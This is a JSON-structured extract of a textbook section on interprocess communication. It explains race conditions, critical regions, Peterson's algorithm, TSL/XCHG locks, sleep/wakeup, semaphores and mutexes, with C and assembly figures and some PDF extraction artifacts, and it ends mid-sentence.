      "2.3 INTERPROCESS COMMUNICATION": {
        "page": 150,
        "children": {
          "2.3.1 Race Conditions": {
            "page": 150,
            "content": "2.3.1 Race Conditions\r\nIn some operating systems, processes that are working together may share\r\nsome common storage that each one can read and write. The shared storage may be\r\nin main memory (possibly in a kernel data structure) or it may be a shared file; the\r\nlocation of the shared memory does not change the nature of the communication or\r\nthe problems that arise. To see how interprocess communication works in practice,\r\nlet us now consider a simple but common example: a print spooler. When a process\n120 PROCESSES AND THREADS CHAP. 2\r\nwants to print a file, it enters the file name in a special spooler directory. Another\r\nprocess, the printer daemon, periodically checks to see if there are any files to be\r\nprinted, and if there are, it prints them and then removes their names from the di\u0002rectory.\r\nImagine that our spooler directory has a very large number of slots, numbered\r\n0, 1, 2, ..., each one capable of holding a file name. Also imagine that there are two\r\nshared variables, out, which points to the next file to be printed, and in, which\r\npoints to the next free slot in the directory. These two variables might well be kept\r\nin a two-word file available to all processes. At a certain instant, slots 0 to 3 are\r\nempty (the files have already been printed) and slots 4 to 6 are full (with the names\r\nof files queued for printing). More or less simultaneously, processes A and B\r\ndecide they want to queue a file for printing. This situation is shown in Fig. 2-21.\r\n4\r\n5\r\n6\r\n7\r\nabc\r\nprog.c\r\nprog.n\r\nProcess A\r\nout = 4\r\nin = 7\r\nProcess B\r\nSpooler\r\ndirectory\r\nFigure 2-21. Tw o processes want to access shared memory at the same time.\r\nIn jurisdictions where Murphy’s law† is applicable, the following could hap\u0002pen. Process A reads in and stores the value, 7, in a local variable called\r\nnext free slot. Just then a clock interrupt occurs and the CPU decides that proc\u0002ess A has run long enough, so it switches to process B. Process B also reads in and\r\nalso gets a 7. It, too, stores it in its local variable next free slot. At this instant\r\nboth processes think that the next available slot is 7.\r\nProcess B now continues to run. It stores the name of its file in slot 7 and\r\nupdates in to be an 8. Then it goes off and does other things.\r\nEventually, process A runs again, starting from the place it left off. It looks at\r\nnext free slot, finds a 7 there, and writes its file name in slot 7, erasing the name\r\nthat process B just put there. Then it computes next free slot + 1, which is 8, and\r\nsets in to 8. The spooler directory is now internally consistent, so the printer dae\u0002mon will not notice anything wrong, but process B will never receive any output.\r\nUser B will hang around the printer for years, wistfully hoping for output that\r\n† If something can go wrong, it will.\nSEC. 2.3 INTERPROCESS COMMUNICATION 121\r\nnever comes. Situations like this, where two or more processes are reading or writ\u0002ing some shared data and the final result depends on who runs precisely when, are\r\ncalled race conditions. Debugging programs containing race conditions is no fun\r\nat all. The results of most test runs are fine, but once in a blue moon something\r\nweird and unexplained happens. Unfortunately, with increasing parallelism due to\r\nincreasing numbers of cores, race condition are becoming more common."
          },
          "2.3.2 Critical Regions": {
            "page": 152,
            "content": "2.3.2 Critical Regions\r\nHow do we avoid race conditions? The key to preventing trouble here and in\r\nmany other situations involving shared memory, shared files, and shared everything\r\nelse is to find some way to prohibit more than one process from reading and writ\u0002ing the shared data at the same time. Put in other words, what we need is mutual\r\nexclusion, that is, some way of making sure that if one process is using a shared\r\nvariable or file, the other processes will be excluded from doing the same thing.\r\nThe difficulty above occurred because process B started using one of the shared\r\nvariables before process A was finished with it. The choice of appropriate primitive\r\noperations for achieving mutual exclusion is a major design issue in any operating\r\nsystem, and a subject that we will examine in great detail in the following sections.\r\nThe problem of avoiding race conditions can also be formulated in an abstract\r\nway. Part of the time, a process is busy doing internal computations and other\r\nthings that do not lead to race conditions. However, sometimes a process has to ac\u0002cess shared memory or files, or do other critical things that can lead to races. That\r\npart of the program where the shared memory is accessed is called the critical\r\nregion or critical section. If we could arrange matters such that no two processes\r\nwere ever in their critical regions at the same time, we could avoid races.\r\nAlthough this requirement avoids race conditions, it is not sufficient for having\r\nparallel processes cooperate correctly and efficiently using shared data. We need\r\nfour conditions to hold to have a good solution:\r\n1. No two processes may be simultaneously inside their critical regions.\r\n2. No assumptions may be made about speeds or the number of CPUs.\r\n3. No process running outside its critical region may block any process.\r\n4. No process should have to wait forever to enter its critical region.\r\nIn an abstract sense, the behavior that we want is shown in Fig. 2-22. Here\r\nprocess A enters its critical region at time T1. A little later, at time T2 process B at\u0002tempts to enter its critical region but fails because another process is already in its\r\ncritical region and we allow only one at a time. Consequently, B is temporarily sus\u0002pended until time T3 when A leaves its critical region, allowing B to enter im\u0002mediately. Eventually B leaves (at T4) and we are back to the original situation\r\nwith no processes in their critical regions.\n122 PROCESSES AND THREADS CHAP. 2\r\nA enters critical region A leaves critical region\r\nB attempts to\r\nenter critical \r\nregion\r\nB enters\r\ncritical region\r\nT1 T2 T3 T4\r\nProcess A \r\nProcess B \r\nB blocked\r\nB leaves\r\ncritical region\r\nTime\r\nFigure 2-22. Mutual exclusion using critical regions."
          },
          "2.3.3 Mutual Exclusion with Busy Waiting": {
            "page": 153,
            "content": "2.3.3 Mutual Exclusion with Busy Waiting\r\nIn this section we will examine various proposals for achieving mutual exclu\u0002sion, so that while one process is busy updating shared memory in its critical re\u0002gion, no other process will enter its critical region and cause trouble.\r\nDisabling Interrupts\r\nOn a single-processor system, the simplest solution is to have each process dis\u0002able all interrupts just after entering its critical region and re-enable them just be\u0002fore leaving it. With interrupts disabled, no clock interrupts can occur. The CPU is\r\nonly switched from process to process as a result of clock or other interrupts, after\r\nall, and with interrupts turned off the CPU will not be switched to another process.\r\nThus, once a process has disabled interrupts, it can examine and update the shared\r\nmemory without fear that any other process will intervene.\r\nThis approach is generally unattractive because it is unwise to give user proc\u0002esses the power to turn off interrupts. What if one of them did it, and never turned\r\nthem on again? That could be the end of the system. Furthermore, if the system is\r\na multiprocessor (with two or more CPUs) disabling interrupts affects only the\r\nCPU that executed the disable instruction. The other ones will continue running\r\nand can access the shared memory.\r\nOn the other hand, it is frequently convenient for the kernel itself to disable in\u0002terrupts for a few instructions while it is updating variables or especially lists. If\r\nan interrupt occurrs while the list of ready processes, for example, is in an incon\u0002sistent state, race conditions could occur. The conclusion is: disabling interrupts is\nSEC. 2.3 INTERPROCESS COMMUNICATION 123\r\noften a useful technique within the operating system itself but is not appropriate as\r\na general mutual exclusion mechanism for user processes.\r\nThe possibility of achieving mutual exclusion by disabling interrupts—even\r\nwithin the kernel—is becoming less every day due to the increasing number of\r\nmulticore chips even in low-end PCs. Tw o cores are already common, four are\r\npresent in many machines, and eight, 16, or 32 are not far behind. In a multicore\r\n(i.e., multiprocessor system) disabling the interrupts of one CPU does not prevent\r\nother CPUs from interfering with operations the first CPU is performing. Conse\u0002quently, more sophisticated schemes are needed.\r\nLock Variables\r\nAs a second attempt, let us look for a software solution. Consider having a sin\u0002gle, shared (lock) variable, initially 0. When a process wants to enter its critical re\u0002gion, it first tests the lock. If the lock is 0, the process sets it to 1 and enters the\r\ncritical region. If the lock is already 1, the process just waits until it becomes 0.\r\nThus, a 0 means that no process is in its critical region, and a 1 means that some\r\nprocess is in its critical region.\r\nUnfortunately, this idea contains exactly the same fatal flaw that we saw in the\r\nspooler directory. Suppose that one process reads the lock and sees that it is 0. Be\u0002fore it can set the lock to 1, another process is scheduled, runs, and sets the lock to\r\n1. When the first process runs again, it will also set the lock to 1, and two proc\u0002esses will be in their critical regions at the same time.\r\nNow you might think that we could get around this problem by first reading\r\nout the lock value, then checking it again just before storing into it, but that really\r\ndoes not help. The race now occurs if the second process modifies the lock just\r\nafter the first process has finished its second check.\r\nStrict Alternation\r\nA third approach to the mutual exclusion problem is shown in Fig. 2-23. This\r\nprogram fragment, like nearly all the others in this book, is written in C. C was\r\nchosen here because real operating systems are virtually always written in C (or\r\noccasionally C++), but hardly ever in languages like Java, Python, or Haskell. C is\r\npowerful, efficient, and predictable, characteristics critical for writing operating\r\nsystems. Java, for example, is not predictable because it might run out of storage at\r\na critical moment and need to invoke the garbage collector to reclaim memory at a\r\nmost inopportune time. This cannot happen in C because there is no garbage col\u0002lection in C. A quantitative comparison of C, C++, Java, and four other languages\r\nis given by Prechelt (2000).\r\nIn Fig. 2-23, the integer variable turn, initially 0, keeps track of whose turn it is\r\nto enter the critical region and examine or update the shared memory. Initially,\r\nprocess 0 inspects turn, finds it to be 0, and enters its critical region. Process 1 also\n124 PROCESSES AND THREADS CHAP. 2\r\nwhile (TRUE) { while (TRUE) {\r\nwhile (turn != 0) /* loop */ ; while (turn != 1) /* loop */ ;\r\ncr itical region( ); cr itical region( );\r\ntur n = 1; tur n = 0;\r\nnoncr itical region( ); noncr itical region( );\r\n} }\r\n(a) (b)\r\nFigure 2-23. A proposed solution to the critical-region problem. (a) Process 0.\r\n(b) Process 1. In both cases, be sure to note the semicolons terminating the while\r\nstatements.\r\nfinds it to be 0 and therefore sits in a tight loop continually testing turn to see when\r\nit becomes 1. Continuously testing a variable until some value appears is called\r\nbusy waiting. It should usually be avoided, since it wastes CPU time. Only when\r\nthere is a reasonable expectation that the wait will be short is busy waiting used. A\r\nlock that uses busy waiting is called a spin lock.\r\nWhen process 0 leaves the critical region, it sets turn to 1, to allow process 1 to\r\nenter its critical region. Suppose that process 1 finishes its critical region quickly,\r\nso that both processes are in their noncritical regions, with turn set to 0. Now\r\nprocess 0 executes its whole loop quickly, exiting its critical region and setting turn\r\nto 1. At this point turn is 1 and both processes are executing in their noncritical re\u0002gions.\r\nSuddenly, process 0 finishes its noncritical region and goes back to the top of\r\nits loop. Unfortunately, it is not permitted to enter its critical region now, because\r\nturn is 1 and process 1 is busy with its noncritical region. It hangs in its while loop\r\nuntil process 1 sets turn to 0. Put differently, taking turns is not a good idea when\r\none of the processes is much slower than the other.\r\nThis situation violates condition 3 set out above: process 0 is being blocked by\r\na process not in its critical region. Going back to the spooler directory discussed\r\nabove, if we now associate the critical region with reading and writing the spooler\r\ndirectory, process 0 would not be allowed to print another file because process 1\r\nwas doing something else.\r\nIn fact, this solution requires that the two processes strictly alternate in enter\u0002ing their critical regions, for example, in spooling files. Neither one would be per\u0002mitted to spool two in a row. While this algorithm does avoid all races, it is not\r\nreally a serious candidate as a solution because it violates condition 3.\r\nPeterson’s Solution\r\nBy combining the idea of taking turns with the idea of lock variables and warn\u0002ing variables, a Dutch mathematician, T. Dekker, was the first one to devise a soft\u0002ware solution to the mutual exclusion problem that does not require strict alterna\u0002tion. For a discussion of Dekker’s algorithm, see Dijkstra (1965).\nSEC. 2.3 INTERPROCESS COMMUNICATION 125\r\nIn 1981, G. L. Peterson discovered a much simpler way to achieve mutual\r\nexclusion, thus rendering Dekker’s solution obsolete. Peterson’s algorithm is\r\nshown in Fig. 2-24. This algorithm consists of two procedures written in ANSI C,\r\nwhich means that function prototypes should be supplied for all the functions de\u0002fined and used. However, to sav e space, we will not show prototypes here or later.\r\n#define FALSE 0\r\n#define TRUE 1\r\n#define N 2 /* number of processes */\r\nint turn; /* whose turn is it? */\r\nint interested[N]; /* all values initially 0 (FALSE) */\r\nvoid enter region(int process); /* process is 0 or 1 */\r\n{\r\nint other; /* number of the other process */\r\nother = 1 − process; /* the opposite of process */\r\ninterested[process] = TRUE; /* show that you are interested */\r\ntur n = process; /* set flag */\r\nwhile (turn == process && interested[other] == TRUE) /* null statement */ ;\r\n}\r\nvoid leave region(int process) /* process: who is leaving */\r\n{\r\ninterested[process] = FALSE; /* indicate departure from critical region */\r\n}\r\nFigure 2-24. Peterson’s solution for achieving mutual exclusion.\r\nBefore using the shared variables (i.e., before entering its critical region), each\r\nprocess calls enter region with its own process number, 0 or 1, as parameter. This\r\ncall will cause it to wait, if need be, until it is safe to enter. After it has finished\r\nwith the shared variables, the process calls leave region to indicate that it is done\r\nand to allow the other process to enter, if it so desires.\r\nLet us see how this solution works. Initially neither process is in its critical re\u0002gion. Now process 0 calls enter region. It indicates its interest by setting its array\r\nelement and sets turn to 0. Since process 1 is not interested, enter region returns\r\nimmediately. If process 1 now makes a call to enter region, it will hang there\r\nuntil interested[0] goes to FALSE, an event that happens only when process 0 calls\r\nleave region to exit the critical region.\r\nNow consider the case that both processes call enter region almost simultan\u0002eously. Both will store their process number in turn. Whichever store is done last\r\nis the one that counts; the first one is overwritten and lost. Suppose that process 1\r\nstores last, so turn is 1. When both processes come to the while statement, process\r\n0 executes it zero times and enters its critical region. Process 1 loops and does not\r\nenter its critical region until process 0 exits its critical region.\n126 PROCESSES AND THREADS CHAP. 2\r\nThe TSL Instruction\r\nNow let us look at a proposal that requires a little help from the hardware.\r\nSome computers, especially those designed with multiple processors in mind, have\r\nan instruction like\r\nTSL RX,LOCK\r\n(Test and Set Lock) that works as follows. It reads the contents of the memory\r\nword lock into register RX and then stores a nonzero value at the memory address\r\nlock. The operations of reading the word and storing into it are guaranteed to be\r\nindivisible—no other processor can access the memory word until the instruction is\r\nfinished. The CPU executing the TSL instruction locks the memory bus to prohibit\r\nother CPUs from accessing memory until it is done.\r\nIt is important to note that locking the memory bus is very different from dis\u0002abling interrupts. Disabling interrupts then performing a read on a memory word\r\nfollowed by a write does not prevent a second processor on the bus from accessing\r\nthe word between the read and the write. In fact, disabling interrupts on processor\r\n1 has no effect at all on processor 2. The only way to keep processor 2 out of the\r\nmemory until processor 1 is finished is to lock the bus, which requires a special\r\nhardware facility (basically, a bus line asserting that the bus is locked and not avail\u0002able to processors other than the one that locked it).\r\nTo use the TSL instruction, we will use a shared variable, lock, to coordinate\r\naccess to shared memory. When lock is 0, any process may set it to 1 using the TSL\r\ninstruction and then read or write the shared memory. When it is done, the process\r\nsets lock back to 0 using an ordinary move instruction.\r\nHow can this instruction be used to prevent two processes from simultaneously\r\nentering their critical regions? The solution is given in Fig. 2-25. There a four-in\u0002struction subroutine in a fictitious (but typical) assembly language is shown. The\r\nfirst instruction copies the old value of lock to the register and then sets lock to 1.\r\nThen the old value is compared with 0. If it is nonzero, the lock was already set, so\r\nthe program just goes back to the beginning and tests it again. Sooner or later it\r\nwill become 0 (when the process currently in its critical region is done with its crit\u0002ical region), and the subroutine returns, with the lock set. Clearing the lock is very\r\nsimple. The program just stores a 0 in lock. No special synchronization instruc\u0002tions are needed.\r\nOne solution to the critical-region problem is now easy. Before entering its\r\ncritical region, a process calls enter region, which does busy waiting until the lock\r\nis free; then it acquires the lock and returns. After leaving the critical region the\r\nprocess calls leave region, which stores a 0 in lock. As with all solutions based on\r\ncritical regions, the processes must call enter region and leave region at the cor\u0002rect times for the method to work. If one process cheats, the mutual exclusion will\r\nfail. In other words, critical regions work only if the processes cooperate.\nSEC. 2.3 INTERPROCESS COMMUNICATION 127\r\nenter region:\r\nTSL REGISTER,LOCK | copy lock to register and set lock to 1\r\nCMP REGISTER,#0 | was lock zero?\r\nJNE enter region | if it was not zero, lock was set, so loop\r\nRET | retur n to caller; critical region entered\r\nleave region:\r\nMOVE LOCK,#0 | store a 0 in lock\r\nRET | retur n to caller\r\nFigure 2-25. Entering and leaving a critical region using the TSL instruction.\r\nAn alternative instruction to TSL is XCHG, which exchanges the contents of two\r\nlocations atomically, for example, a register and a memory word. The code is\r\nshown in Fig. 2-26, and, as can be seen, is essentially the same as the solution with\r\nTSL. All Intel x86 CPUs use XCHG instruction for low-level synchronization.\r\nenter region:\r\nMOVE REGISTER,#1 | put a 1 in the register\r\nXCHG REGISTER,LOCK | swap the contents of the register and lock var iable\r\nCMP REGISTER,#0 | was lock zero?\r\nJNE enter region | if it was non zero, lock was set, so loop\r\nRET | retur n to caller; critical region entered\r\nleave region:\r\nMOVE LOCK,#0 | store a 0 in lock\r\nRET | retur n to caller\r\nFigure 2-26. Entering and leaving a critical region using the XCHG instruction."
          },
          "2.3.4 Sleep and Wakeup": {
            "page": 158,
            "content": "2.3.4 Sleep and Wakeup\r\nBoth Peterson’s solution and the solutions using TSL or XCHG are correct, but\r\nboth have the defect of requiring busy waiting. In essence, what these solutions do\r\nis this: when a process wants to enter its critical region, it checks to see if the entry\r\nis allowed. If it is not, the process just sits in a tight loop waiting until it is.\r\nNot only does this approach waste CPU time, but it can also have unexpected\r\neffects. Consider a computer with two processes, H, with high priority, and L, with\r\nlow priority. The scheduling rules are such that H is run whenever it is in ready\r\nstate. At a certain moment, with L in its critical region, H becomes ready to run\r\n(e.g., an I/O operation completes). H now begins busy waiting, but since L is never\n128 PROCESSES AND THREADS CHAP. 2\r\nscheduled while H is running, L never gets the chance to leave its critical region, so\r\nH loops forever. This situation is sometimes referred to as the priority inversion\r\nproblem.\r\nNow let us look at some interprocess communication primitives that block in\u0002stead of wasting CPU time when they are not allowed to enter their critical regions.\r\nOne of the simplest is the pair sleep and wakeup. Sleep is a system call that\r\ncauses the caller to block, that is, be suspended until another process wakes it up.\r\nThe wakeup call has one parameter, the process to be awakened. Alternatively,\r\nboth sleep and wakeup each have one parameter, a memory address used to match\r\nup sleeps with wakeups.\r\nThe Producer-Consumer Problem\r\nAs an example of how these primitives can be used, let us consider the pro\u0002ducer-consumer problem (also known as the bounded-buffer problem). Two\r\nprocesses share a common, fixed-size buffer. One of them, the producer, puts infor\u0002mation into the buffer, and the other one, the consumer, takes it out. (It is also pos\u0002sible to generalize the problem to have m producers and n consumers, but we will\r\nconsider only the case of one producer and one consumer because this assumption\r\nsimplifies the solutions.)\r\nTrouble arises when the producer wants to put a new item in the buffer, but it is\r\nalready full. The solution is for the producer to go to sleep, to be awakened when\r\nthe consumer has removed one or more items. Similarly, if the consumer wants to\r\nremove an item from the buffer and sees that the buffer is empty, it goes to sleep\r\nuntil the producer puts something in the buffer and wakes it up.\r\nThis approach sounds simple enough, but it leads to the same kinds of race\r\nconditions we saw earlier with the spooler directory. To keep track of the number\r\nof items in the buffer, we will need a variable, count. If the maximum number of\r\nitems the buffer can hold is N, the producer’s code will first test to see if count is N.\r\nIf it is, the producer will go to sleep; if it is not, the producer will add an item and\r\nincrement count.\r\nThe consumer’s code is similar: first test count to see if it is 0. If it is, go to\r\nsleep; if it is nonzero, remove an item and decrement the counter. Each of the proc\u0002esses also tests to see if the other should be awakened, and if so, wakes it up. The\r\ncode for both producer and consumer is shown in Fig. 2-27.\r\nTo express system calls such as sleep and wakeup in C, we will show them as\r\ncalls to library routines. They are not part of the standard C library but presumably\r\nwould be made available on any system that actually had these system calls. The\r\nprocedures insert item and remove item, which are not shown, handle the\r\nbookkeeping of putting items into the buffer and taking items out of the buffer.\r\nNow let us get back to the race condition. It can occur because access to count\r\nis unconstrained. As a consequence, the following situation could possibly occur.\r\nThe buffer is empty and the consumer has just read count to see if it is 0. At that\nSEC. 2.3 INTERPROCESS COMMUNICATION 129\r\n#define N 100 /* number of slots in the buffer */\r\nint count = 0; /* number of items in the buffer */\r\nvoid producer(void)\r\n{\r\nint item;\r\nwhile (TRUE) { /* repeat forever */\r\nitem = produce item( ); /* generate next item */\r\nif (count == N) sleep( ); /* if buffer is full, go to sleep */\r\ninser t item(item); /* put item in buffer */\r\ncount = count + 1; /* increment count of items in buffer */\r\nif (count == 1) wakeup(consumer); /* was buffer empty? */\r\n}\r\n}\r\nvoid consumer(void)\r\n{\r\nint item;\r\nwhile (TRUE) { /* repeat forever */\r\nif (count == 0) sleep( ); /* if buffer is empty, got to sleep */\r\nitem = remove item( ); /* take item out of buffer */\r\ncount = count − 1; /* decrement count of items in buffer */\r\nif (count == N − 1) wakeup(producer); /* was buffer full? */\r\nconsume item(item); /* pr int item */\r\n}\r\n}\r\nFigure 2-27. The producer-consumer problem with a fatal race condition.\r\ninstant, the scheduler decides to stop running the consumer temporarily and start\r\nrunning the producer. The producer inserts an item in the buffer, increments count,\r\nand notices that it is now 1. Reasoning that count was just 0, and thus the consu\u0002mer must be sleeping, the producer calls wakeup to wake the consumer up.\r\nUnfortunately, the consumer is not yet logically asleep, so the wakeup signal is\r\nlost. When the consumer next runs, it will test the value of count it previously read,\r\nfind it to be 0, and go to sleep. Sooner or later the producer will fill up the buffer\r\nand also go to sleep. Both will sleep forever.\r\nThe essence of the problem here is that a wakeup sent to a process that is not\r\n(yet) sleeping is lost. If it were not lost, everything would work. A quick fix is to\r\nmodify the rules to add a wakeup waiting bit to the picture. When a wakeup is\r\nsent to a process that is still awake, this bit is set. Later, when the process tries to\r\ngo to sleep, if the wakeup waiting bit is on, it will be turned off, but the process\r\nwill stay awake. The wakeup waiting bit is a piggy bank for storing wakeup sig\u0002nals. The consumer clears the wakeup waiting bit in every iteration of the loop.\n130 PROCESSES AND THREADS CHAP. 2\r\nWhile the wakeup waiting bit saves the day in this simple example, it is easy to\r\nconstruct examples with three or more processes in which one wakeup waiting bit\r\nis insufficient. We could make another patch and add a second wakeup waiting bit,\r\nor maybe 8 or 32 of them, but in principle the problem is still there."
          },
          "2.3.5 Semaphores": {
            "page": 161,
            "content": "2.3.5 Semaphores\r\nThis was the situation in 1965, when E. W. Dijkstra (1965) suggested using an\r\ninteger variable to count the number of wakeups saved for future use. In his pro\u0002posal, a new variable type, which he called a semaphore, was introduced. A sem\u0002aphore could have the value 0, indicating that no wakeups were saved, or some\r\npositive value if one or more wakeups were pending.\r\nDijkstra proposed having two operations on semaphores, now usually called\r\ndown and up (generalizations of sleep and wakeup, respectively). The down oper\u0002ation on a semaphore checks to see if the value is greater than 0. If so, it decre\u0002ments the value (i.e., uses up one stored wakeup) and just continues. If the value is\r\n0, the process is put to sleep without completing the down for the moment. Check\u0002ing the value, changing it, and possibly going to sleep, are all done as a single,\r\nindivisible atomic action. It is guaranteed that once a semaphore operation has\r\nstarted, no other process can access the semaphore until the operation has com\u0002pleted or blocked. This atomicity is absolutely essential to solving synchronization\r\nproblems and avoiding race conditions. Atomic actions, in which a group of related\r\noperations are either all performed without interruption or not performed at all, are\r\nextremely important in many other areas of computer science as well.\r\nThe up operation increments the value of the semaphore addressed. If one or\r\nmore processes were sleeping on that semaphore, unable to complete an earlier\r\ndown operation, one of them is chosen by the system (e.g., at random) and is al\u0002lowed to complete its down. Thus, after an up on a semaphore with processes\r\nsleeping on it, the semaphore will still be 0, but there will be one fewer process\r\nsleeping on it. The operation of incrementing the semaphore and waking up one\r\nprocess is also indivisible. No process ever blocks doing an up, just as no process\r\nev er blocks doing a wakeup in the earlier model.\r\nAs an aside, in Dijkstra’s original paper, he used the names P and V instead of\r\ndown and up, respectively. Since these have no mnemonic significance to people\r\nwho do not speak Dutch and only marginal significance to those who do—\r\nProberen (try) and Verhogen (raise, make higher)—we will use the terms down and\r\nup instead. These were first introduced in the Algol 68 programming language.\r\nSolving the Producer-Consumer Problem Using Semaphores\r\nSemaphores solve the lost-wakeup problem, as shown in Fig. 2-28. To make\r\nthem work correctly, it is essential that they be implemented in an indivisible way.\r\nThe normal way is to implement up and down as system calls, with the operating\nSEC. 2.3 INTERPROCESS COMMUNICATION 131\r\nsystem briefly disabling all interrupts while it is testing the semaphore, updating it,\r\nand putting the process to sleep, if necessary. As all of these actions take only a\r\nfew instructions, no harm is done in disabling interrupts. If multiple CPUs are\r\nbeing used, each semaphore should be protected by a lock variable, with the TSL or\r\nXCHG instructions used to make sure that only one CPU at a time examines the\r\nsemaphore.\r\nBe sure you understand that using TSL or XCHG to prevent several CPUs from\r\naccessing the semaphore at the same time is quite different from the producer or\r\nconsumer busy waiting for the other to empty or fill the buffer. The semaphore op\u0002eration will take only a few microseconds, whereas the producer or consumer\r\nmight take arbitrarily long.\r\n#define N 100 /* number of slots in the buffer */\r\ntypedef int semaphore; /* semaphores are a special kind of int */\r\nsemaphore mutex = 1; /* controls access to critical region */\r\nsemaphore empty = N; /* counts empty buffer slots */\r\nsemaphore full = 0; /* counts full buffer slots */\r\nvoid producer(void)\r\n{\r\nint item;\r\nwhile (TRUE) { /* TRUE is the constant 1 */\r\nitem = produce item( ); /* generate something to put in buffer */\r\ndown(&empty); /* decrement empty count */\r\ndown(&mutex); /* enter critical region */\r\ninser t item(item); /* put new item in buffer */\r\nup(&mutex); /* leave critical region */\r\nup(&full); /* increment count of full slots */\r\n}\r\n}\r\nvoid consumer(void)\r\n{\r\nint item;\r\nwhile (TRUE) { /* infinite loop */\r\ndown(&full); /* decrement full count */\r\ndown(&mutex); /* enter critical region */\r\nitem = remove item( ); /* take item from buffer */\r\nup(&mutex); /* leave critical region */\r\nup(&empty); /* increment count of empty slots */\r\nconsume item(item); /* do something with the item */\r\n}\r\n}\r\nFigure 2-28. The producer-consumer problem using semaphores.\n132 PROCESSES AND THREADS CHAP. 2\r\nThis solution uses three semaphores: one called full for counting the number of\r\nslots that are full, one called empty for counting the number of slots that are empty,\r\nand one called mutex to make sure the producer and consumer do not access the\r\nbuffer at the same time. Full is initially 0, empty is initially equal to the number of\r\nslots in the buffer, and mutex is initially 1. Semaphores that are initialized to 1 and\r\nused by two or more processes to ensure that only one of them can enter its critical\r\nregion at the same time are called binary semaphores. If each process does a\r\ndown just before entering its critical region and an up just after leaving it, mutual\r\nexclusion is guaranteed.\r\nNow that we have a good interprocess communication primitive at our dis\u0002posal, let us go back and look at the interrupt sequence of Fig. 2-5 again. In a sys\u0002tem using semaphores, the natural way to hide interrupts is to have a semaphore,\r\ninitially set to 0, associated with each I/O device. Just after starting an I/O device,\r\nthe managing process does a down on the associated semaphore, thus blocking im\u0002mediately. When the interrupt comes in, the interrupt handler then does an up on\r\nthe associated semaphore, which makes the relevant process ready to run again. In\r\nthis model, step 5 in Fig. 2-5 consists of doing an up on the device’s semaphore, so\r\nthat in step 6 the scheduler will be able to run the device manager. Of course, if\r\nseveral processes are now ready, the scheduler may choose to run an even more im\u0002portant process next. We will look at some of the algorithms used for scheduling\r\nlater on in this chapter.\r\nIn the example of Fig. 2-28, we have actually used semaphores in two different\r\nways. This difference is important enough to make explicit. The mutex semaphore\r\nis used for mutual exclusion. It is designed to guarantee that only one process at a\r\ntime will be reading or writing the buffer and the associated variables. This mutual\r\nexclusion is required to prevent chaos. We will study mutual exclusion and how to\r\nachieve it in the next section.\r\nThe other use of semaphores is for synchronization. The full and empty sem\u0002aphores are needed to guarantee that certain event sequences do or do not occur. In\r\nthis case, they ensure that the producer stops running when the buffer is full, and\r\nthat the consumer stops running when it is empty. This use is different from mutual\r\nexclusion."
          },
          "2.3.6 Mutexes": {
            "page": 163,
            "content": "2.3.6 Mutexes\r\nWhen the semaphore’s ability to count is not needed, a simplified version of\r\nthe semaphore, called a mutex, is sometimes used. Mutexes are good only for man\u0002aging mutual exclusion to some shared resource or piece of code. They are easy\r\nand efficient to implement, which makes them especially useful in thread packages\r\nthat are implemented entirely in user space.\r\nA mutex is a shared variable that can be in one of two states: unlocked or\r\nlocked. Consequently, only 1 bit is required to represent it, but in practice an inte\u0002ger often is used, with 0 meaning unlocked and all other values meaning locked.\nSEC. 2.3 INTERPROCESS COMMUNICATION 133\r\nTw o procedures are used with mutexes. When a thread (or process) needs access\r\nto a critical region, it calls mutex lock. If the mutex is currently unlocked (mean\u0002ing that the critical region is available), the call succeeds and the calling thread is\r\nfree to enter the critical region.\r\nOn the other hand, if the mutex is already locked, the calling thread is blocked\r\nuntil the thread in the critical region is finished and calls mutex unlock. If multi\u0002ple threads are blocked on the mutex, one of them is chosen at random and allowed\r\nto acquire the lock.\r\nBecause mutexes are so simple, they can easily be implemented in user space\r\nprovided that a TSL or XCHG instruction is available. The code for mutex lock and\r\nmutex unlock for use with a user-level threads package are shown in Fig. 2-29.\r\nThe solution with XCHG is essentially the same.\r\nmutex lock:\r\nTSL REGISTER,MUTEX | copy mutex to register and set mutex to 1\r\nCMP REGISTER,#0 | was mutex zero?\r\nJZE ok | if it was zero, mutex was unlocked, so return\r\nCALL thread yield | mutex is busy; schedule another thread\r\nJMP mutex lock | tr y again\r\nok: RET | retur n to caller; critical region entered\r\nmutex unlock:\r\nMOVE MUTEX,#0 | store a 0 in mutex\r\nRET | retur n to caller\r\nFigure 2-29. Implementation of mutex lock and mutex unlock.\r\nThe code of mutex lock is similar to the code of enter region of Fig. 2-25 but\r\nwith a crucial difference. When enter region fails to enter the critical region, it\r\nkeeps testing the lock repeatedly (busy waiting). Eventually, the clock runs out\r\nand some other process is scheduled to run. Sooner or later the process holding the\r\nlock gets to run and releases it.\r\nWith (user) threads, the situation is different because there is no clock that\r\nstops threads that have run too long. Consequently, a thread that tries to acquire a\r\nlock by busy waiting will loop forever and never acquire the lock because it never\r\nallows any other thread to run and release the lock.\r\nThat is where the difference between enter region and mutex lock comes in.\r\nWhen the later fails to acquire a lock, it calls thread yield to give up the CPU to\r\nanother thread. Consequently there is no busy waiting. When the thread runs the\r\nnext time, it tests the lock again.\r\nSince thread yield is just a call to the thread scheduler in user space, it is very\r\nfast. As a consequence, neither mutex lock nor mutex unlock requires any kernel\r\ncalls. Using them, user-level threads can synchronize entirely in user space using\r\nprocedures that require only a handful of instructions.\n134 PROCESSES AND THREADS CHAP. 2\r\nThe mutex system that we have described above is a bare-bones set of calls.\r\nWith all software, there is always a demand for more features, and synchronization\r\nprimitives are no exception. For example, sometimes a thread package offers a call\r\nmutex trylock that either acquires the lock or returns a code for failure, but does\r\nnot block. This call gives the thread the flexibility to decide what to do next if there\r\nare alternatives to just waiting.\r\nThere is a subtle issue that up until now we hav e glossed over but which is\r\nworth at least making explicit. With a user-space threads package there is no prob\u0002lem with multiple threads having access to the same mutex, since all the threads\r\noperate in a common address space. However, with most of the earlier solutions,\r\nsuch as Peterson’s algorithm and semaphores, there is an unspoken assumption that\r\nmultiple processes have access to at least some shared memory, perhaps only one\r\nword, but something. If processes have disjoint address spaces, as we have consis\u0002tently said, how can they share the turn variable in Peterson’s algorithm, or sema\u0002phores or a common buffer?\r\nThere are two answers. First, some of the shared data structures, such as the\r\nsemaphores, can be stored in the kernel and accessed only by means of system\r\ncalls. This approach eliminates the problem. Second, most modern operating sys\u0002tems (including UNIX and Windows) offer a way for processes to share some por\u0002tion of their address space with other processes. In this way, buffers and other data\r\nstructures can be shared. In the worst case, that nothing else is possible, a shared\r\nfile can be used.\r\nIf two or more processes share most or all of their address spaces, the dis\u0002tinction between processes and threads becomes somewhat blurred but is neverthe\u0002less present. Two processes that share a common address space still have different\r\nopen files, alarm timers, and other 